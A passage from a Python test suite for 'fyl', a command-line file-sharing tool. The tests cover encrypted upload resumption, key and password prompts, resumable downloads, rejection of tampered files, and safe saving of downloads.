        resumed = self.rerun(command, input=value + '\n')
        self.assertEqual(resumed.returncode, 0, resumed.stderr)
        self.assertEqual(self.keyed(resumed.stdout)[1], value.split('.')[2])

    def test_an_encrypted_resume_takes_the_key_apart_or_refuses(self):
        file = self.fixture()
        self.state.failures = {'/part': [503, 503, 503]}
        command, value = self.sealed_resume(self.run_cli(file, '--encrypt').stderr)
        upload, token, key, mtime = value.split('.')
        keyless = '.'.join([upload, token, mtime])
        no_key = 'fyl: This resume value has no key. Type the key or the share link at a terminal, or set FYL_KEY.\n'
        for env, message in [(None, no_key),
                             ({'FYL_KEY': b64url(os.urandom(32))}, "fyl: This key doesn't open this upload. Use the value its interrupted run printed.\n"),
                             ({'FYL_KEY': 'not a key'}, 'fyl: FYL_KEY: This key is incomplete or damaged.\n'),
                             ({'FYL_KEY': '{}/d/{}%23{}'.format(self.origin, UPLOAD_ID, b64url(os.urandom(32)))},
                              self.exposed() + "fyl: This key doesn't open this upload. Use the value its interrupted run printed.\n")]:
            refused = self.rerun(command, input=keyless + '\n', env=env)
            self.assertEqual((refused.returncode, refused.stdout, refused.stderr), (2, '', message), env)
        # Without pins in the status (a server without them, such as another implementation), no resume.
        self.state.status_pins = False
        refused = self.rerun(command, input=value + '\n')
        self.assertEqual((refused.returncode, refused.stderr),
                         (2, "fyl: This server can't resume an encrypted upload safely (its status lists no pins). Start a new upload.\n"))
        self.state.status_pins = True
        # The share link works as well as the key.
        resumed = self.rerun(command, input=keyless + '\n', env={'FYL_KEY': '{}/d/{}#{}'.format(self.origin, UPLOAD_ID, key)})
        self.assertEqual((resumed.returncode, resumed.stderr), (0, ''))
        self.assertEqual(self.keyed(resumed.stdout)[1], key)
        self.assertEqual(self.paths().count('/abort'), 0)

    def test_a_resumed_upload_keeps_its_mode(self):
        file = self.fixture()
        _, _, token = self.interrupted(file)
        refused = self.run_cli(file, '--resume', token, '--encrypt')
        self.assertEqual((refused.returncode, refused.stdout, refused.stderr), (2, '', "fyl: This upload isn't encrypted. Leave out --encrypt and use the "
                                                                                       'value its interrupted run printed, or start a new upload.\n'))
        self.reset()
        self.state.failures = {'/part': [503, 503, 503]}
        _, value = self.sealed_resume(self.run_cli(file, '--encrypt').stderr)
        refused = self.run_cli(file, '--resume', '.'.join(value.split('.')[:2]))
        self.assertEqual((refused.returncode, refused.stderr), (2, "fyl: This upload is encrypted. Use the value its interrupted run printed, which ends "
                                                                   "in the key and the file's modification time.\n"))
        self.assertEqual(self.paths().count('/abort'), 0)

    def test_a_file_named_download_or_decrypt_still_uploads(self):
        for word in ('download', 'decrypt'):
            (self.root / word).write_bytes(b'fyl.at fixture')
            for args in [(word, '--endpoint', self.endpoint), (word, '--once', '--endpoint', self.endpoint),
                         ('./' + word, '--endpoint', self.endpoint), ('--endpoint', self.endpoint, '--', word)]:
                result = self.run_raw(*args, cwd=self.root)
                self.assertEqual((result.returncode, result.stdout, result.stderr), (0, LINK + '\n', ''), args)
                self.assertEqual(self.state.metadata['filename'], word)
        # A link after the word makes it the command, even next to such a file; -o does too.
        self.publish(b'other bytes', name='other.txt')
        result = self.download('{}/d/{}'.format(self.origin, UPLOAD_ID))
        self.assertEqual((result.returncode, result.stdout, result.stderr), (0, './other.txt\n', ''))
        result = self.run_raw('download', '-o', 'x', '--endpoint', self.endpoint, cwd=self.root)
        self.assertEqual((result.returncode, result.stdout), (2, ''))
        self.assertIn('fyl: download needs a link', result.stderr)
        # Without such a file the word alone is the command, which asks for a link or a file; a folder of that name
        # never uploaded, so it doesn't count.
        sent = len(self.state.requests)
        for make in (Path.unlink, Path.mkdir):
            for word, message in [('download', "download needs a link: fyl download 'https://fyl.at/d/<id>#<key>'"),
                                  ('decrypt', 'decrypt needs the saved file: fyl decrypt ./fyl-<id>.age')]:
                make(self.root / word)
                for args in [(word, '--endpoint', self.endpoint), (word, '-v', '--endpoint', self.endpoint)]:
                    result = self.run_raw(*args, cwd=self.root)
                    self.assertEqual((result.returncode, result.stdout), (2, ''))
                    self.assertTrue(result.stderr.startswith('fyl: {}\nTry: fyl {}'.format(message, word)), (args, result.stderr))
        self.assertEqual(len(self.state.requests), sent)

    def test_download_saves_a_raw_file_under_the_servers_name(self):
        data = os.urandom(70_000)
        self.publish(data, name="report & '旅行'.zip")
        result = self.download('{}/d/{}/what-the-segment-says.exe'.format(self.origin, UPLOAD_ID))
        self.assertEqual((result.returncode, result.stdout, result.stderr), (0, "./report & '旅行'.zip\n", ''))
        self.assertEqual((self.root / "report & '旅行'.zip").read_bytes(), data)
        # The info route, then the file by its ID: the segment is never sent and never names the file.
        self.assertEqual(self.paths(), ['/info', '/d/'])
        self.assertEqual((self.state.requests[1][2]['path'], self.state.requests[1][2]['Accept']), ('/d/{}?dl=1'.format(UPLOAD_ID), '*/*'))
        # A protected one: FYL_PASSWORD goes as Basic to the info route, which releases the name, then to the download.
        self.publish(data, name='locked.bin', password='tide-lamp-moss-41')
        out = self.folder()
        result = self.download('{}/d/{}'.format(self.origin, UPLOAD_ID), '-o', str(out), env={'FYL_PASSWORD': 'tide-lamp-moss-41'})
        self.assertEqual((result.returncode, result.stdout, result.stderr), (0, '{}\n'.format(out / 'locked.bin'), ''))
        self.assertEqual((out / 'locked.bin').read_bytes(), data)
        # -o - writes a raw file to standard output instead.
        text = 'plain text\n' * 5000
        self.publish(text.encode(), name='notes.txt')
        result = self.download('{}/d/{}'.format(self.origin, UPLOAD_ID), '-o', '-')
        self.assertEqual((result.returncode, result.stdout, result.stderr), (0, text, ''))

    def test_a_key_for_a_raw_file_is_refused_before_anything_is_consumed(self):
        self.publish(b'raw bytes', name='raw.txt', once=True)
        result = self.download('{}/d/{}#{}'.format(self.origin, UPLOAD_ID, b64url(os.urandom(32))))
        self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', "fyl: This link has a key, but the file isn't encrypted.\n"))
        self.assertEqual(self.paths(), ['/info'])
        self.assertFalse((self.root / 'raw.txt').exists())

    def test_a_wrong_key_uses_up_nothing_and_the_right_one_closes_the_one_time_link(self):
        content = os.urandom(100_000)
        _, link, key = self.encrypted(content, '--once')
        out = self.folder()
        result = self.download(link.replace(key, b64url(os.urandom(32))), '-o', str(out))
        self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', WRONG_KEY))
        self.assertNotIn('/d/', self.paths())
        # A malformed key is refused before any request.
        sent = len(self.state.requests)
        for broken in (link[:-1], link + 'A', link[:-1] + '!'):
            result = self.download(broken, '-o', str(out))
            self.assertEqual((result.returncode, result.stdout, result.stderr), (2, '', 'fyl: This key is incomplete or damaged.\n'), broken)
        self.assertEqual(len(self.state.requests), sent)
        self.assertEqual(os.listdir(out), [])
        # The right key downloads, then closes the one-time session at once.
        result = self.download(link, '-o', str(out))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.paths()[-3:], ['/info', '/d/', '/done'])
        result = self.download(link, '-o', str(self.folder('again')))
        self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', 'fyl: This file is no longer available.\n'))

    def test_damaged_incomplete_or_extended_files_are_never_saved(self):
        content = os.urandom(200_000)
        _, link, key = self.encrypted(content)
        stored, out = self.state.transfer['data'], self.folder()

        def flip(data, at):
            return data[:at] + bytes([data[at] ^ 1]) + data[at + 1:]
        # Served bytes: another head than the verified one, a damaged chunk, cut at a chunk boundary, data after the end.
        for served, message in [(flip(stored, 100), CORRUPT), (flip(stored, 70_000), CORRUPT), (stored[:184 + 65552], 'fyl: The file is incomplete.\n'),
                                (stored + bytes(16), CORRUPT)]:
            self.state.served = served
            result = self.download(link, '-o', str(out))
            self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', message), len(served))
            self.assertEqual(os.listdir(out), [], 'no partial or temporary file')
        self.state.served = None
        # Found by the key check, before anything is consumed: another format version, a damaged meta.
        head, meta = self.state.transfer['head'], self.state.transfer['meta']
        sent = self.paths().count('/d/')
        for change, message in [({'head': head.replace(b'v1', b'v2', 1)}, 'fyl: This file needs a newer fyl.\n'),
                                ({'meta': flip(meta, 300)}, CORRUPT), ({'meta': head + meta[184:]}, CORRUPT)]:
            self.state.transfer.update(change)
            result = self.download(link, '-o', str(out))
            self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', message), change)
            self.state.transfer.update(head=head, meta=meta)
        self.assertEqual(self.paths().count('/d/'), sent)
        self.assertNotIn(key.encode(), b''.join(self.state.wire))

    def test_an_interrupted_download_continues_with_range(self):
        content = os.urandom(300_000)
        _, link, _ = self.encrypted(content)
        stored, out = self.state.transfer['data'], self.folder()
        self.state.cuts = [100_000]
        result = self.download(link, '-o', str(out / 'copy'), '--verbose')
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual((out / 'copy').read_bytes(), content)
        self.assertIn('Download interrupted, continuing in 1s (1/5)', result.stderr)
        # From the first chunk not yet verified (chunk 1 at 184 + 65552), for the same object.
        ranges = [(request[2]['Range'], request[2]['If-Range']) for request in self.state.requests if request[0] == '/d/']
        self.assertEqual(ranges, [(None, None), ('bytes=65736-', '"{}"'.format(hashlib.md5(stored).hexdigest()))])
        # A raw file goes on from the bytes written.
        data = os.urandom(150_000)
        self.publish(data, name='raw.bin')
        self.state.cuts, sent = [70_000], len(self.state.requests)
        result = self.download('{}/d/{}'.format(self.origin, UPLOAD_ID), '-o', str(out))
        self.assertEqual((result.returncode, (out / 'raw.bin').read_bytes()), (0, data), result.stderr)
        self.assertEqual([request[2]['Range'] for request in self.state.requests[sent:] if request[0] == '/d/'], [None, 'bytes=70000-'])
        # A busy server's Retry-After sets the pause.
        self.state.failures = {'/d/': [(503, None, 5)]}
        result = self.download('{}/d/{}'.format(self.origin, UPLOAD_ID), '-o', str(out / 'later.bin'), '--verbose')
        self.assertEqual((result.returncode, (out / 'later.bin').read_bytes()), (0, data), result.stderr)
        self.assertRegex(result.stderr, r'Download interrupted, continuing in [56]s \(1/5\)\n')
        # A 206 for another range, or short of it, would put the wrong bytes in the file.
        for broken in ('range', 'length'):
            self.state.cuts, self.state.bad_206 = [70_000], broken
            result = self.download('{}/d/{}'.format(self.origin, UPLOAD_ID), '-o', str(out / 'wrong.bin'))
            self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', 'fyl: The server sent another part of the file than asked for.\n'), broken)
        self.state.bad_206 = None
        self.assertEqual(sorted(os.listdir(out)), ['copy', 'later.bin', 'raw.bin'])
        # Interrupted again and again: given up, nothing left behind.
        self.state.failures = {'/d/': [(503, None, 1)] * 6}
        result = self.download('{}/d/{}'.format(self.origin, UPLOAD_ID), '-o', str(out / 'never'))
        self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', 'fyl: Download interrupted. Try again.\n'))
        self.assertEqual(sorted(os.listdir(out)), ['copy', 'later.bin', 'raw.bin'])

    def test_a_key_sent_in_the_address_works_with_a_warning(self):
        content = b'exposed but still encrypted'
        _, link, key = self.encrypted(content)
        out = self.folder()
        result = self.download('{}/d/{}%23{}'.format(self.origin, UPLOAD_ID, key), '-o', str(out / 'copy'))
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stderr, self.exposed())
        self.assertEqual((out / 'copy').read_bytes(), content)
        # fyl itself sends it nowhere.
        self.assertNotIn(key.encode(), b''.join(self.state.wire))

    def test_downloads_replace_nothing_and_write_no_dotfiles(self):
        dotfile = self.root / '.bashrc'
        dotfile.write_bytes(b'echo hello\n')
        _, link, _ = self.encrypted(file=dotfile)
        out = self.folder()
        result = self.download(link, '-o', str(out))
        self.assertEqual((result.returncode, result.stdout, result.stderr), (0, '{}\n'.format(out / '_bashrc'), "fyl: Saving '.bashrc' as '_bashrc'.\n"))
        self.assertEqual(stat.S_IMODE((out / '_bashrc').stat().st_mode), 0o600)
        # An existing target, a dangling symlink too, stops before anything is consumed.
        sent = self.paths().count('/d/')
        exists = "fyl: Saving '.bashrc' as '_bashrc'.\nfyl: '{}' already exists. Choose another name or folder with -o.\n".format(out / '_bashrc')
        for make in [lambda: None, lambda: ((out / '_bashrc').unlink(), (out / '_bashrc').symlink_to(out / 'missing'))]:
            make()
            result = self.download(link, '-o', str(out))
            self.assertEqual((result.returncode, result.stdout, result.stderr), (2, '', exists))
        self.assertEqual(self.paths().count('/d/'), sent)
        # No encrypted bytes to standard output, and no folder made up.
        result = self.download(link, '-o', '-')
        self.assertEqual((result.returncode, result.stdout, result.stderr), (2, '', NO_STDOUT))
        result = self.download(link, '-o', str(self.root / 'nowhere' / 'file'))
        self.assertEqual((result.returncode, result.stdout, result.stderr), (2, '', "fyl: The folder for '{}' doesn't exist.\n".format(self.root / 'nowhere' / 'file')))
        for folder in (str(self.root / 'nowhere') + '/', 'nowhere/', 'nowhere/.'):
            result = self.download(link, '-o', folder)
            self.assertEqual((result.returncode, result.stdout, result.stderr), (2, '', "fyl: The folder '{}' doesn't exist.\n".format(folder)))
        # A name the filesystem can't hold fails (exit 1), still before anything is consumed.
        result = self.download(link, '-o', str(out / ('x' * 300)))
        self.assertEqual((result.returncode, result.stdout), (1, ''))
        self.assertTrue(result.stderr.startswith("fyl: Can't create '{}': ".format(out / ('x' * 300))), result.stderr)
        self.assertEqual(self.paths().count('/d/'), sent)
        self.assertEqual(sorted(os.listdir(out)), ['_bashrc'])

    def test_a_link_without_its_key_takes_it_from_fyl_key_or_the_terminal(self):
        content = os.urandom(10_000)
        _, link, key = self.encrypted(content)
        bare, out = link.split('#')[0], self.folder()
        result = self.download(bare, '-o', str(out))
        self.assertEqual((result.returncode, result.stdout, result.stderr), (2, '', NO_KEY))
        self.assertNotIn('/d/', self.paths())
        # FYL_KEY in any form the prompt takes; another file's link is refused.
        # A link with the key after %23 gets the warning it gets on the command line.
        exposed = '{}/d/{}%23{}'.format(self.origin, UPLOAD_ID, key)
        for index, (value, note) in enumerate([(key, ''), (link, ''), ('  {}\n'.format(key), ''), (exposed, self.exposed())]):
            result = self.download(bare, '-o', str(out / str(index)), env={'FYL_KEY': value})
            self.assertEqual((result.returncode, result.stderr, (out / str(index)).read_bytes()), (0, note, content), value)
        result = self.download(bare, env={'FYL_KEY': '{}/d/{}#{}'.format(self.origin, 'x' * 43, key)})
        self.assertEqual((result.returncode, result.stdout, result.stderr), (2, '', 'fyl: FYL_KEY: This link is for another file.\n'))
        # At a terminal it is typed without echo, and a key that doesn't open the file may be typed again.
        args = ['download', bare, '--endpoint', self.endpoint, '-o', str(out / 'typed')]
        result, shown, echo = self.run_pty(args, [(KEY_PROMPT, b64url(os.urandom(32)) + '\r'), (KEY_PROMPT, 'short\r'), (KEY_PROMPT, key + '\r')])
        self.assertEqual((result.returncode, result.stdout), (0, '{}\n'.format(out / 'typed')), result.stderr)
        self.assertEqual(result.stderr, WRONG_KEY + 'fyl: This key is incomplete or damaged.\n')
        self.assertEqual((shown, echo), ((KEY_PROMPT + '\r\n') * 3, True))
        self.assertEqual((out / 'typed').read_bytes(), content)
        args[-1] = str(out / 'typed-exposed')
        result, _, _ = self.run_pty(args, [(KEY_PROMPT, exposed + '\r')])
        self.assertEqual((result.returncode, result.stdout, result.stderr), (0, '{}\n'.format(out / 'typed-exposed'), self.exposed()))

    def test_a_link_from_stdin_never_brings_a_second_secret(self):
        content = os.urandom(10_000)
        _, link, key = self.encrypted(content)
        bare, out = link.split('#')[0], self.folder()
        result = self.download('-', '-o', str(out / 'a'), input=link + '\n')
        self.assertEqual((result.returncode, (out / 'a').read_bytes()), (0, content), result.stderr)
        # The key is never read from the stdin that carried the link: FYL_KEY or the terminal.
        result = self.download('-', '-o', str(out / 'b'), input=bare + '\n' + key + '\n')
        self.assertEqual((result.returncode, result.stdout, result.stderr), (2, '', NO_KEY))
        result = self.download('-', '-o', str(out / 'b'), input=bare + '\n', env={'FYL_KEY': key})
        self.assertEqual((result.returncode, (out / 'b').read_bytes()), (0, content), result.stderr)
        # `pbpaste | fyl download -`: the link piped in, the key typed at the terminal.
        args = ['download', '-', '--endpoint', self.endpoint, '-o', str(out / 'c')]
        result, shown, _ = self.run_pty(args, [(KEY_PROMPT, key + '\r')], piped=bare + '\n')
        self.assertEqual((result.returncode, result.stdout, shown), (0, '{}\n'.format(out / 'c'), KEY_PROMPT + '\r\n'))
        # Typed at the terminal, the link doesn't echo either.
        args = ['download', '-', '--endpoint', self.endpoint, '-o', str(out / 'd')]
        result, shown, echo = self.run_pty(args, [('Link: ', link + '\r')])
        self.assertEqual((result.returncode, shown, echo), (0, 'Link: \r\n', True), result.stderr)
        self.assertEqual((out / 'd').read_bytes(), content)

    def test_a_protected_download_asks_for_its_password(self):
        content, secret = os.urandom(1000), 'tide pool 42'
        _, link, _ = self.encrypted(content, '--password', env={'FYL_PASSWORD': secret})
        out = self.folder()
        result, shown, echo = self.run_pty(['download', link, '--endpoint', self.endpoint, '-o', str(out / 'f')],
                                           [('Password: ', 'not it\r'), ('Password: ', secret + '\r')])
        self.assertEqual((result.returncode, result.stderr), (0, 'fyl: Wrong password. 4 tries left.\n'))
        self.assertEqual((shown, echo), ('Password: \r\n' * 2, True))
        self.assertEqual((out / 'f').read_bytes(), content)
        # Paused after wrong tries: the wait, and no download.
        self.state.tries = 0
        sent = self.paths().count('/d/')
        result = self.download(link, '-o', str(out / 'g'), env={'FYL_PASSWORD': secret})
        self.assertEqual((result.returncode, result.stdout, result.stderr),
                         (1, '', 'fyl: Too many wrong passwords for this file. Try again after Oct 26 07:33 UTC.\n'))
        self.assertEqual(self.paths().count('/d/'), sent)

    def test_standard_output_is_refused_before_any_key_or_password(self):
        _, link, _ = self.encrypted(os.urandom(1000), '--password', env={'FYL_PASSWORD': 'tide pool 42'})
        sent = len(self.state.requests)
        # A wrong password would use up a try, a missing key would be asked for: neither happens.
        for target, env in [(link, {'FYL_PASSWORD': 'not the password'}), (link.split('#')[0], {}), (link.split('#')[0], {'FYL_PASSWORD': 'tide pool 42'})]:
            result = self.download(target, '-o', '-', env=env)
            self.assertEqual((result.returncode, result.stdout, result.stderr), (2, '', NO_STDOUT), env)
        self.assertEqual(self.state.tries, 5)
        self.assertEqual([request[:2] for request in self.state.requests[sent:]], [('/info', 'GET')] * 3)
        self.assertEqual({request[2]['Authorization'] for request in self.state.requests[sent:]}, {None})

    def test_a_password_that_cant_be_right_costs_no_try(self):
        data, secret = os.urandom(1000), 'tide pool 42'
        self.publish(data, name='locked.bin', password=secret)
        link = '{}/d/{}'.format(self.origin, UPLOAD_ID)
        # Empty, too short where NFC can't change the length, too long, a control character: never sent.
        for password in ('', 'abc', 'pässw', 'x' * 201, 'tide\tpool 42'):
            result = self.download(link, env={'FYL_PASSWORD': password})
            self.assertEqual((result.returncode, result.stdout, result.stderr), (2, '', 'fyl: FYL_PASSWORD: {}\n'.format(RULE)), password)
        self.assertEqual(({request[2]['Authorization'] for request in self.state.requests}, self.state.tries), ({None}, 5))
        # Typed, it is asked for again; one that may be right is sent (NFC can make 2 x U+0958 four characters).
        out = self.folder()
        args = ['download', link, '--endpoint', self.endpoint, '-o', str(out / 'f')]
        result, shown, echo = self.run_pty(args, [('Password: ', '\r'), ('Password: ', 'abc\r'), ('Password: ', '\u0958\u0958\r'), ('Password: ', secret + '\r')])
        self.assertEqual((result.returncode, result.stdout), (0, '{}\n'.format(out / 'f')), result.stderr)
        self.assertEqual(result.stderr, 'fyl: {0}\nfyl: {0}\nfyl: Wrong password. 4 tries left.\n'.format(RULE))
        self.assertEqual((shown, echo), ('Password: \r\n' * 4, True))
        self.assertEqual((out / 'f').read_bytes(), data)
        self.assertEqual(sum(request[2]['Authorization'] is not None for request in self.state.requests if request[0] == '/info'), 2)

    def test_termination_at_a_hidden_prompt_restores_the_terminal(self):
        _, link, _ = self.encrypted(os.urandom(1000), '--password', env={'FYL_PASSWORD': 'tide pool 42'})
        saved = self.root / 'fyl-{}.age'.format(UPLOAD_ID[:8])
        saved.write_bytes(self.state.transfer['data'])
        out = self.folder()
        sent = len(self.state.requests)
        for args, prompt in [(['download', link.split('#')[0], '--endpoint', self.endpoint, '-o', str(out)], KEY_PROMPT),
                             (['download', link, '--endpoint', self.endpoint, '-o', str(out)], 'Password: '),
                             (['download', '-', '--endpoint', self.endpoint, '-o', str(out)], 'Link: '),
                             (['decrypt', str(saved), '--endpoint', self.endpoint], KEY_PROMPT),
                             ([str(self.fixture()), '--password', '--endpoint', self.endpoint], PROMPT)]:
            result, shown, echo = self.run_pty(args, [(prompt, signal.SIGTERM)])
            self.assertEqual((result.returncode, result.stdout, shown, echo), (-signal.SIGTERM, '', prompt + '\r\n', True), args)
        self.assertEqual(os.listdir(out), [])
        self.assertNotIn('/d/', self.paths()[sent:])
        self.assertNotIn('/init', self.paths()[sent:])

    def test_a_download_waits_while_the_file_is_still_uploading(self):
        data = os.urandom(5000)
        self.publish(data, name='early.bin')
        self.state.uploading = 2
        result = self.download('{}/d/{}'.format(self.origin, UPLOAD_ID))
        self.assertEqual((result.returncode, result.stdout), (0, './early.bin\n'), result.stderr)
        self.assertEqual(result.stderr, 'fyl: Still uploading, 50 % done. Waiting 1s.\n' * 2)
        self.assertEqual((self.root / 'early.bin').read_bytes(), data)

    @unittest.skipUnless(Path('/dev/full').exists(), 'no /dev/full')
    def test_a_full_or_closed_stdout_keeps_the_download(self):
        content = os.urandom(1000)
        file, link, _ = self.encrypted(content, '--once')
        out = self.folder()
        command = [str(NATIVE), 'download', link, '--endpoint', self.endpoint, '-o', str(out)]
        with open('/dev/full', 'w') as device:
            result = subprocess.run(command, stdout=device, stderr=subprocess.PIPE, text=True, env=self.environment(), timeout=60)
        name = file.name
        self.assertEqual((result.returncode, result.stderr),
                         (74, '{}\nfyl: Could not write to standard output: No space left on device (os error 28).\n'.format(out / name)))
        self.assertEqual((out / name).read_bytes(), content)
        # The one-time session closes all the same.
        self.assertEqual(self.paths()[-1], '/done')
        # A closed stdout: the path goes to stderr too.
        self.reset()
        _, link, _ = self.encrypted(content)
        self.state.hold = True
        process = subprocess.Popen([str(NATIVE), 'download', link, '--endpoint', self.endpoint, '-o', str(self.folder('closed'))],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, env=self.environment())
        try:
            process.stdout.close()
            self.assertTrue(self.state.started.wait(10), 'the download did not start')
            self.state.release.set()
            with process.stderr:
                err = process.stderr.read()
            self.assertEqual(process.wait(timeout=15), 74, err)
        finally:
            if process.poll() is None:
                process.kill()
                process.communicate()
        self.assertEqual(err, '{}\nfyl: Could not write to standard output: Broken pipe (os error 32).\n'.format(self.root / 'closed' / name))

    def test_ctrl_c_and_failing_writes_leave_no_partial_file(self):
        content = os.urandom(300_000)
        _, link, _ = self.encrypted(content)
        out = self.folder()
        self.state.hold = True
        # Ctrl+C or termination.
        for sent in (signal.SIGINT, signal.SIGTERM):
            self.state.started.clear()
            self.state.release.clear()
            process = subprocess.Popen([str(NATIVE), 'download', link, '--endpoint', self.endpoint, '-o', str(out)],
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, env=self.environment())
            try:
                self.assertTrue(self.state.started.wait(10), 'the download did not start')
                # The first chunk verified and went to the temporary file (0600, next to the target).
                deadline = time.monotonic() + 10
                while not any(os.path.getsize(out / name) for name in os.listdir(out)) and time.monotonic() < deadline:
                    time.sleep(0.02)
                (temporary,) = os.listdir(out)
                self.assertRegex(temporary, r'^\.fyl-[0-9a-f]{16}\.part$')
                self.assertEqual(stat.S_IMODE((out / temporary).stat().st_mode), 0o600)
                process.send_signal(sent)
                stdout, _ = process.communicate(timeout=15)
                self.assertEqual((process.returncode, stdout), (-sent, ''))
            finally:
                self.state.release.set()
                if process.poll() is None:
                    process.kill()
                    process.communicate()
            self.assertEqual(os.listdir(out), [], sent)
        # A write that fails (here past RLIMIT_FSIZE) ends the download and removes the temporary file.
        self.state.hold = False
        result = subprocess.run([str(NATIVE), 'download', link, '--endpoint', self.endpoint, '-o', str(out)], capture_output=True, text=True,
                                env=self.environment(), timeout=60, preexec_fn=lambda: resource.setrlimit(resource.RLIMIT_FSIZE, (100_000, 100_000)))
        self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', 'fyl: Could not write the file: File too large (os error 27).\n'))
        self.assertEqual(os.listdir(out), [])

    def test_a_target_that_appears_meanwhile_keeps_the_verified_file(self):
        content = os.urandom(300_000)
        file, link, _ = self.encrypted(content)
        out = self.folder()
        self.state.hold = True
        process = subprocess.Popen([str(NATIVE), 'download', link, '--endpoint', self.endpoint, '-o', str(out)],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, env=self.environment())
        try:
            self.assertTrue(self.state.started.wait(10), 'the download did not start')
            (out / file.name).write_bytes(b'someone else')
            self.state.release.set()
            stdout, stderr = process.communicate(timeout=15)
        finally:
            if process.poll() is None:
                process.kill()
                process.communicate()
        (temporary,) = [name for name in os.listdir(out) if name != file.name]
        self.assertEqual((process.returncode, stdout, stderr), (1, '', "fyl: '{}' appeared during the download. The verified file is kept as '{}'.\n"
                                                                .format(out / file.name, out / temporary)))
        self.assertEqual(((out / file.name).read_bytes(), (out / temporary).read_bytes()), (b'someone else', content))

    def test_a_file_larger_than_the_free_space_is_never_requested(self):
        self.publish(b'bytes', name='huge.bin')
        self.state.info_size = 1 << 60
        result = self.download('{}/d/{}'.format(self.origin, UPLOAD_ID))
        self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', "fyl: Not enough free space for './huge.bin': it needs {} bytes.\n".format(1 << 60)))
        self.assertEqual(self.paths(), ['/info'])
        self.assertFalse((self.root / 'huge.bin').exists())

    def test_a_download_that_is_gone_or_refused_says_why(self):
        link = '{}/d/{}'.format(self.origin, UPLOAD_ID)
        result = self.download(link)
        self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', 'fyl: Transfer not found.\n'))
        self.publish(b'bytes', name='file.bin', mode='e3')
        result = self.download(link)
        self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', 'fyl: This file needs a newer fyl.\n'))
        self.publish(b'bytes', name='file.bin')
        for failures, message in [({'/info': [(403, 'quarantined')]}, 'fyl: simulated failure\n'), ({'/d/': [(410, 'expired')]}, 'fyl: simulated failure\n'),
                                  ({'/d/': [(503, 'unsupported_mode', 1)] * 6}, 'fyl: This file needs a newer fyl.at.\n')]:
            self.state.failures = failures
            result = self.download(link)
            self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', message), failures)
        self.assertFalse((self.root / 'file.bin').exists())

    def test_files_from_the_browser_rust_and_age_decrypt(self):
        # tests/vectors/e2ee/cross: written by each producer's production path (docs/E2EE.md, Interoperability evidence).
        checked = 0
        for producer in ('browser', 'rust', 'age'):
            for vector in json.loads((VECTORS / 'cross' / (producer + '.json')).read_text())['vectors']:
                if not vector.get('ciphertext'):
                    continue
                data = bytes.fromhex(vector['ciphertext'])
                self.publish(data, mode='e2ee', head=bytes.fromhex(vector['head']), meta=bytes.fromhex(vector['meta']))
                out = self.folder('{}-{}'.format(producer, vector['plaintextSize']))
                result = self.download('{}/d/{}#{}'.format(self.origin, UPLOAD_ID, vector['key']), '-o', str(out))
                self.assertEqual((result.returncode, result.stderr), (0, ''), (producer, vector['why']))
                saved = Path(result.stdout.strip())
                self.assertEqual((saved.name, hashlib.sha256(saved.read_bytes()).hexdigest()), (vector['name'], vector['plaintextSha256']))
                # fyl decrypt takes the age identity string too, in either case.
                (out / 'saved.age').write_bytes(data)
                opened = self.run_raw('decrypt', str(out / 'saved.age'), '--endpoint', self.endpoint, env={'FYL_KEY': vector['ageIdentity'].lower()})
                self.assertEqual((opened.returncode, opened.stdout), (0, '{}\n'.format(out / 'saved')), opened.stderr)
                self.assertEqual(hashlib.sha256((out / 'saved').read_bytes()).hexdigest(), vector['plaintextSha256'])
                checked += 1
        self.assertEqual(checked, 6)

    def test_decrypt_refuses_wrong_keys_damage_and_existing_files(self):
        content = os.urandom(100_000)
        _, link, key = self.encrypted(content)
        stored = self.state.transfer['data']
        saved = self.root / 'fyl-{}.age'.format(UPLOAD_ID[:8])
        saved.write_bytes(stored)
        before = sorted(os.listdir(self.root))

        def decrypt(*args, key=key):
            return self.run_raw('decrypt', *args, '--endpoint', self.endpoint, env={'FYL_KEY': key})
        for args, value, outcome in [((str(saved),), b64url(os.urandom(32)), (1, '', WRONG_KEY)),
                                     ((str(saved),), '{}/d/{}#{}'.format(self.origin, 'x' * 43, key), (2, '', 'fyl: FYL_KEY: This link is for another file.\n')),
                                     ((str(saved), '-o', '-'), key, (2, '', NO_STDOUT))]:
            result = decrypt(*args, key=value)
            self.assertEqual((result.returncode, result.stdout, result.stderr), outcome, args)
        # A link with the key after %23 opens the file, with the warning.
        result = decrypt(str(saved), '-o', str(self.root / 'exposed'), key='{}/d/{}%23{}'.format(self.origin, UPLOAD_ID, key))
        self.assertEqual((result.returncode, result.stdout, result.stderr), (0, '{}\n'.format(self.root / 'exposed'), self.exposed()))
        self.assertEqual((self.root / 'exposed').read_bytes(), content)
        (self.root / 'exposed').unlink()
        cut = self.root / 'cut.age'
        cut.write_bytes(stored[:184 + 65552])
        result = decrypt(str(cut), '-o', str(self.root / 'cut'))
        self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', 'fyl: The file is incomplete.\n'))
        plain = self.root / 'cipher.bin'
        plain.write_bytes(stored)
        result = decrypt(str(plain))
        self.assertEqual((result.returncode, result.stderr), (2, "fyl: '{}' doesn't end in .age: name the decrypted file with -o.\n".format(plain)))
        self.assertEqual(sorted(os.listdir(self.root)), sorted(before + ['cut.age', 'cipher.bin']), 'nothing partial left behind')
        (self.root / 'fyl-{}'.format(UPLOAD_ID[:8])).write_bytes(b'already here')
        result = decrypt(str(saved))
        self.assertEqual((result.returncode, result.stderr),
                         (2, "fyl: '{}' already exists. Choose another name or folder with -o.\n".format(self.root / 'fyl-{}'.format(UPLOAD_ID[:8]))))
